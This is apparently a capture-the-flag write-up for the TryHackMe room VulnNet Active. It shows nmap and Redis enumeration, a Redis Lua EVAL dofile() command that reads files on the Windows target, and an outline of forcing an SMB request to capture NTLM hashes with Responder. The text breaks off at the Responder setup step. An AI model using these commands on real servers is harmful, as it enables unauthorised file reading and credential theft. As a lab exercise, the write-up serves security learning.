# 9 - VulnNet

Room link --> [https://tryhackme.com/room/vulnnetactive](https://tryhackme.com/room/vulnnetactive)

Nmap Scan returns: `sudo nmap -sSVC -p- -v -Pn -T4 10.10.102.28`&#x20;

{% code overflow="wrap" lineNumbers="true" %}
```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
6379/tcp  open  redis         Redis key-value store 2.8.2402
9389/tcp  open  mc-nmf        .NET Message Framing
49665/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49822/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
{% endcode %}

### Redis (port 6379)

[https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
# automatic enumeration.
nmap --script redis-info -sV -p 6379 <IP> -Pn
msf> use auxiliary/scanner/redis/redis_server

# mannual enumeration.
nc -vn 10.10.10.10 6379
redis-cli -h 10.10.10.10 # sudo apt-get install redis-tools.
10.10.66.252:6379> INFO # gives some info about the server-client.
10.10.66.252:6379> CONFIG GET * # we got a username here: [104) "C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402"]

```
{% endcode %}

So the current user name is `enterprise-security`.

### Exploitation <a href="#exploitation-of-redis" id="exploitation-of-redis"></a>

Going through the HackTricks list, we find an [article](https://www.agarri.fr/blog/archives/2014/09/11/trying\_to\_hack\_redis\_via\_http\_requests/index.html) that shows how to exploit earlier versions of Redis (our version 2.8.2402 is amongst them):

{% hint style="warning" %}
“Redis can execute Lua scripts (in a sandbox, more on that later) via the “EVAL” command. The sandbox allows the dofile() command (WHY???). It can be used to enumerate files and directories. No specific privilege is needed by Redis… If the Lua script is syntaxically invalid or attempts to set global variables, the error messages will leak some content of the target file”
{% endhint %}

#### Reading files <a href="#reading-files" id="reading-files"></a>

As explained in the linked article, the command we use is the following:

{% code overflow="wrap" lineNumbers="true" %}
```bash
redis-cli -h 10.10.245.19 eval "dofile('<PATH TO FILE>')" 0
```
{% endcode %}

We try to read some of the [common windows files](https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/file\_inclusion\_windows.txt) that are usually used for Local File Inclusion.

Let's read the "user.txt" file as asked in the question:

{% code overflow="wrap" lineNumbers="true" %}
```bash
10.10.66.252:6379> EVAL "dofile('C:/Users/enterprise-security/Desktop/user.txt')" 0
```
{% endcode %}

#### SMB credentials capturing[#](https://blog.raw.pm/en/TryHackMe-VulnNet-Active-write-up/#SMB-credentials-capturing) <a href="#smb-credentials-capturing" id="smb-credentials-capturing"></a>

LUA `dofile()` allows us to request a file but since we are on Windows it allows us to request a share as well for example: `dofile('//host/share')`.

So if we launch a SMB server with Responder on one hand and force the server to request a fake share on the other hand, we should be able to capture a NTLM hash.

#### Step 1

we first set up a listener using `Impacket's Responder.py`.



























